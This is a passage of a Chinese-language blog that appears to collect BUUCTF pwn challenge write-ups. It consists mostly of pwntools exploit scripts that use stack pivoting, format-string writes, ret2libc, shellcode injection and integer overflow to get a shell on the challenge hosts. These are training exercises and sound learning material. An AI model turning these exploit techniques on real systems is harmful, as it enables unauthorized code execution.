class="hljs-string">&quot;choice &gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-string">&#x27;22&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-string">&#x27;0x30&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="十九、ciscn-2019-s-4"><a href="#十九、ciscn-2019-s-4" class="headerlink" title="十九、ciscn_2019_s_4"></a>十九、ciscn_2019_s_4</h3><p>这题好像之前有过？所以这里就不再多说了，栈迁移的题目，直接贴exp了</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29292</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>system=<span class="hljs-number">0x8048400</span><br>leave_ret=<span class="hljs-number">0x80484b8</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x24</span>+<span class="hljs-string">&#x27;beef&#x27;</span><br>p.sendafter(<span class="hljs-string">&quot;name?&quot;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&quot;beef&quot;</span>)<br>ebp=u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(ebp)<br>s_buf=ebp-<span class="hljs-number">0x38</span><br>payload=(<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(system)+p32(<span class="hljs-number">1</span>)+p32(s_buf+<span class="hljs-number">0x10</span>)+<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>).ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;a&#x27;</span>)+p32(s_buf)+p32(leave_ret)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十、jarvisoj-fm"><a href="#二十、jarvisoj-fm" class="headerlink" title="二十、jarvisoj_fm"></a>二十、jarvisoj_fm</h3><p>一道很平常的格式化字符串的题目，就直接给exp了</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25092</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>x=<span class="hljs-number">0x0804A02C</span><br><br>payload=p32(x)+<span class="hljs-string">&#x27;%11$n&#x27;</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十一、-HarekazeCTF2019-baby-rop2"><a href="#二十一、-HarekazeCTF2019-baby-rop2" class="headerlink" title="二十一、[HarekazeCTF2019]baby_rop2"></a>二十一、[HarekazeCTF2019]baby_rop2</h3><p>一道常规rop题目，除了这题printf会出现下图的匹配不到libc之外，其他没什么，而对于这个，只要换个函数，我这边用read，就可以了。噢，还有！目录里面没有flag</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210506220516.png"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26933</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pop_rdi=<span class="hljs-number">0x400733</span><br>ret=<span class="hljs-number">0x4004d1</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(pop_rdi)+p64(read_got)+p64(printf_plt)+p64(main)<br>p.sendlineafter(<span class="hljs-string">&#x27;name? &#x27;</span>,payload)<br>p.recvline()<br>read=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(read)<br>libc=LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>,read)<br>libc_base=read-libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendline(payload)<br>p.recvline()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十二、ez-pz-hackover-2016"><a href="#二十二、ez-pz-hackover-2016" class="headerlink" title="二十二、ez_pz_hackover_2016"></a>二十二、ez_pz_hackover_2016</h3><p>常规checksec一下，查看保护机制</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210509091010.png"></p>
<p>nx都没开，应该是注入shellcode来getshell了，进入ida看看代码</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210509091119.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210509091125.png"></p>
<p>确实，没给后门函数，nx没开，应该就是注入shellcode了，我们看看代码，首先题目先把s的在栈上的地址泄露出来了，后面则需要绕过crashme，这个简单，先输入这个，加上\x00让strcmp检验通过，之后，在vuln里面的memcpy存在着溢出，里面的栈比较小，而外面的栈较大，可以写入shellcode，接下就计算shellcode的地址，以及溢出点的偏移距离，这边有坑的就是IDA里面的偏移是错的，我们需要进入gdb动调试进行找寻地址以及偏移距离</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210509091757.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210509091821.png"></p>
<p>我们泄露的地址距离字符串起始地址0xffc445f0相减之后，相差0x1c</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210509092023.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210509092054.png"></p>
<p>垃圾字符串偏移是18，但是我们还输入了crashme\x00，所以总的偏移是26个。之后就是return to shellcode了</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&quot;node3.buuoj.cn&quot;,29815)</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>gdb.attach(p)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>s_buf=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(s_buf)<br>shellcode=asm(shellcraft.sh())<br>payload=<span class="hljs-string">&quot;crashme\x00&quot;</span>.ljust(<span class="hljs-number">26</span>,<span class="hljs-string">&#x27;a&#x27;</span>)+p32(s_buf-<span class="hljs-number">0x1c</span>)+shellcode<br>p.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十三、-Black-Watch-入群题-PWN"><a href="#二十三、-Black-Watch-入群题-PWN" class="headerlink" title="二十三、[Black Watch 入群题]PWN"></a>二十三、[Black Watch 入群题]PWN</h3><p>常规checksec一下</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210509171725.png"></p>
<p>只开启了nx保护，进入ida看看代码</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210509171818.png"></p>
<p>给了两次输入，第一次在.bss段上，第二次是栈，栈上的只够覆盖到返回地址，但是.bss却可以输入大量数据，所以要劫持栈到.bss进行rop，所以要让ebp的值为s的地址，返回地址为leave，把栈劫持到.bss上，其他剩下就是常规的rop</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26260</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>leave_ret=<span class="hljs-number">0x8048408</span><br>s_buf=<span class="hljs-number">0x0804A300</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>payload=<span class="hljs-string">&#x27;xxxx&#x27;</span>+p32(write_plt)+p32(main)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>p.sendafter(<span class="hljs-string">&quot;name?&quot;</span>,payload)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p32(s_buf)+p32(leave_ret)<br>p.sendafter(<span class="hljs-string">&quot;say?&quot;</span>,payload)<br>write=u32(p.recv(<span class="hljs-number">4</span>))<br><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(write)<br>libc=LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;xxxx&#x27;</span>+p32(system)+p32(main)+p32(binsh)<br>p.recv()<br>p.send(payload)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p32(s_buf)+p32(leave_ret)<br>p.recv()<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十四、jarvisoj-tell-me-something"><a href="#二十四、jarvisoj-tell-me-something" class="headerlink" title="二十四、jarvisoj_tell_me_something"></a>二十四、jarvisoj_tell_me_something</h3><p>这题，进入ida里面</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210509174709.png"></p>
<p>有个这个函数，可以看见，已经读取了flag，并且还会将其输出，并且main函数有溢出点，跳转到这，再接收flag即可</p>
<p>exp：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">p</span>=remote(&#x27;node3.buuoj.cn&#x27;,28478)<br>context.<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*0x88+p64(0x400620)<br>p.sendlineafter(<span class="hljs-string">&quot;message:&quot;</span>,payload)<br>p.recvline()<br>p.recvall()<br></code></pre></td></tr></table></figure>

<h3 id="二十五、gwctf-2019-easy-pwn"><a href="#二十五、gwctf-2019-easy-pwn" class="headerlink" title="二十五、gwctf_2019_easy_pwn"></a>二十五、gwctf_2019_easy_pwn</h3><p>照例checksec</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210509181618.png"></p>
<p>只开启了nx，进入ida发现是c++写的，看不懂。。。</p>
<img src="/2021/04/07/2021-04-07-buu03/QQ图片20210509181725.png" style="zoom:80%;">

<p>直接输入是不够溢出的，然后往下看，发现还有个strcpy，可能可以溢出，但是v4不知道咋来的，然后就跑去百度了（真没志气，hh），发现其实能看懂应该很简单，不过可能就是为了让人看不懂吧，嗯，应该要学c++了！（下次一定）</p>
<p>这边是I可以被替换为pretty，所以填入I，被转换溢出，而跳转进行rop</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210509181629.png"></p>
<p>明白这个，其他也就没什么了</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26014</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main=<span class="hljs-number">0x8049091</span><br><br>payload=<span class="hljs-string">&#x27;I&#x27;</span>*<span class="hljs-number">16</span>+p32(puts_plt)+p32(main)+p32(puts_got)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;pretty&#x27;</span>*<span class="hljs-number">16</span>)<br>p.recv(<span class="hljs-number">12</span>)<br>puts=u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts))<br>one_gadget=puts-<span class="hljs-number">0x05f140</span>+<span class="hljs-number">0x5f066</span><br><span class="hljs-comment">#system=puts-0x24800</span><br><span class="hljs-comment">#binsh=puts+0xf9eeb</span><br><span class="hljs-comment">#payload=&#x27;I&#x27;*16+p32(system)+&#x27;dead&#x27;+p32(binsh)</span><br>payload=<span class="hljs-string">&#x27;I&#x27;</span>*<span class="hljs-number">16</span>+p32(one_gadget)<br>p.send(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h3 id="二十六、wustctf2020-getshell"><a href="#二十六、wustctf2020-getshell" class="headerlink" title="二十六、wustctf2020_getshell"></a>二十六、wustctf2020_getshell</h3><p>一道简单题，直接exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28677</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1c</span>+p32(<span class="hljs-number">0x0804851B</span>)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十七、mrctf2020-easyoverflow"><a href="#二十七、mrctf2020-easyoverflow" class="headerlink" title="二十七、mrctf2020_easyoverflow"></a>二十七、mrctf2020_easyoverflow</h3><p>虽然checksec完，保护全开了，但是程序很简单，真的只是溢出覆盖即可，就不多说了</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28551</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">&#x27;n0t_r3@11y_f1@g&#x27;</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十八、cmcc-pwnme1"><a href="#二十八、cmcc-pwnme1" class="headerlink" title="二十八、cmcc_pwnme1"></a>二十八、cmcc_pwnme1</h3><p>这题，本来是平常的ret2libc的，但是，靠，给坑了</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210509212554-1622863156087.png"></p>
<p>是的，这里给了个“后门函数”！，假的，害我一直想为什么不能获取，以为是不是接收出了问题。原因却是home里面是不存在flag的，怎么可能获取flag</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27186</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>addr=<span class="hljs-number">0x08048624</span><br>p.sendlineafter(<span class="hljs-string">&quot;6. Exit&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xA8</span>+p32(puts_plt)+p32(addr)+p32(puts_got)<br>p.sendlineafter(<span class="hljs-string">&#x27;Please input the name of fruit:&#x27;</span>,payload)<br>p.recvline()<br>puts=u32(p.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-string">&quot;puts_addr ----&gt;&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(puts))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts)<br>libc_base=puts-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>payload =<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xa8</span>+p32(system)+<span class="hljs-string">&#x27;xxxx&#x27;</span>+p32(binsh)<br>p.sendlineafter(<span class="hljs-string">&#x27;Please input the name of fruit:&#x27;</span>,payload)<br>p.recvline()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十九、jarvisoj-level1"><a href="#二十九、jarvisoj-level1" class="headerlink" title="二十九、jarvisoj_level1"></a>二十九、jarvisoj_level1</h3><p>常规checksec一下</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210509215951-1622863179022.png"></p>
<p>发现什么都没开，第一想法就是注入shellcode，结果。。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210509220210-1622863188055.png"></p>
<p>结果ida里面竟然确实是给了buf的地址，再加上</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210509220530-1622863189908.png"></p>
<p>嗯，好家伙，直接shellcode了，然后。。。远程不通，本地通了，没想明白，跑去百度了，结果发现，远程连接，竟然是先输入，再输出栈上的buf地址，靠！然后方法就变成了ret2libc了</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210509220817-1622863191858.png"></p>
<p>这波竟然是给的附件不准确，见识到了！就跟ida里面栈偏移可能会错一样，以后多多注意自己动手进行调试和连接</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26819</span>)<br><span class="hljs-comment">#p=process(&#x27;./level1&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./level1&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-string">context.os=&#x27;linux&#x27;</span><br><span class="hljs-string">context.arch=&#x27;i386&#x27;</span><br><span class="hljs-string">p.recvuntil(&quot;this:0x&quot;)</span><br><span class="hljs-string">buf_addr=int(p.recv(8),16)</span><br><span class="hljs-string">print hex(buf_addr)</span><br><span class="hljs-string">shellcode=asm(shellcraft.sh())</span><br><span class="hljs-string">payload=(shellcode).ljust(0x8c,&#x27;a&#x27;)+p32(buf_addr)</span><br><span class="hljs-string">p.sendline(payload)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr=elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(write_plt)+p32(main_addr)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>p.sendline(payload)<br>write=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&#x27;write addr: &#x27;</span>+<span class="hljs-built_in">hex</span>(write))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&quot;write&quot;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br>payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(system)+<span class="hljs-string">&#x27;xxxx&#x27;</span>+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十、bjdctf-2020-babystack2"><a href="#三十、bjdctf-2020-babystack2" class="headerlink" title="三十、bjdctf_2020_babystack2"></a>三十、bjdctf_2020_babystack2</h3><p>常规checksec</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210515212002.png"></p>
<p>保护没开几个，进入ida静态分析一波，</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210515212030.png"></p>
<p>代码很简单，输入一个数字，不能超过10，然后这个数值作为后续输入的大小，并且能看左边有给后门函数，那么就是溢出劫持rip即可，认真观察，输入的nbytes前面是int，后面却是unsigned了，所以存在整型溢出，输入一个负数，即可变为很大的整数</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26091</span>)<br>get_shell=<span class="hljs-number">0x0400726</span><br>p.recvuntil(<span class="hljs-string">&quot;name:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;-1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(get_shell)<br>p.sendlineafter(<span class="hljs-string">&quot;name?&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十一、jarvisoj-level3-x64"><a href="#三十一、jarvisoj-level3-x64" class="headerlink" title="三十一、jarvisoj_level3_x64"></a>三十一、jarvisoj_level3_x64</h3><p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210516114609-1621136841078.png"></p>
<p>程序很简单，应该是道rop，有溢出点，有write泄露函数，这题考点应该是在于是64位程序，使用寄存器传参，而write的参数需要三个寄存器才行，我第一个想到的是ret2csu，刚好有三个前三个寄存器，没想到，没利用成功，不知道为什么。有师傅知道的话，恳请指点一番！感激不尽！</p>
<p>然后就是百度了一下，发现这题有趣，使用ROPgadget可以找到rdi和rsi两个寄存器，而第三个rdx寄存不需要去控制，里面的值已经存有200，可以直接使用了，所以就是正常构造rop即可</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210516115336.png"></p>
<p>所以这题得到的就是，要多观察我们需要构造的寄存器里面的值是否已经可以使用，需不需要额外构造</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25077</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pppppp_ret=<span class="hljs-number">0x4006aa</span>     <span class="hljs-comment">#pop_rbx_rbp_r12_r13_r14_r15_ret</span><br>mov_rdx_rsi_edi=<span class="hljs-number">0x400690</span><br>ret=<span class="hljs-number">0x400499</span><br>pop_rdi=<span class="hljs-number">0x4006b3</span><br>pp_ret=<span class="hljs-number">0x4006b1</span>    <span class="hljs-comment">#pop_rsi_r15_ret</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">payload=&#x27;a&#x27;*0x88+p64(pppppp_ret)</span><br><span class="hljs-string">payload+=p64(0)*2+p64(ret)+p64(8)+p64(read_got)+p64(1)</span><br><span class="hljs-string">payload+=p64(mov_rdx_rsi_edi)+p64(write_plt)+p64(main)</span><br><span class="hljs-string">p.sendlineafter(&#x27;Input:&#x27;,payload)</span><br><span class="hljs-string">p.recv()</span><br><span class="hljs-string">write=u64(p.recv(6).ljust(8,&#x27;\0&#x27;))</span><br><span class="hljs-string">log.info(&quot;wirte addr:&quot;+hex(write))</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x88</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>)			<br>payload += p64(pp_ret) + p64(read_got) + p64(<span class="hljs-number">0</span>)	<br>payload += p64(write_plt)					<br>payload += p64(main)									<br>p.sendlineafter(<span class="hljs-string">&quot;Input:\n&quot;</span>, payload)<br>read = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))	<br>log.info(<span class="hljs-string">&quot;read addr:&quot;</span>+<span class="hljs-built_in">hex</span>(read))<br>libc = LibcSearcher(<span class="hljs-string">&quot;read&quot;</span>,read)<br>libc_base = read - libc.dump(<span class="hljs-string">&quot;read&quot;</span>)<br>system = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">&#x27;Input:&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十二、jarvisoj-level4"><a href="#三十二、jarvisoj-level4" class="headerlink" title="三十二、jarvisoj_level4"></a>三十二、jarvisoj_level4</h3><p>32位的rop，就没有上面那么麻烦了，直接在栈上写就好了</p>
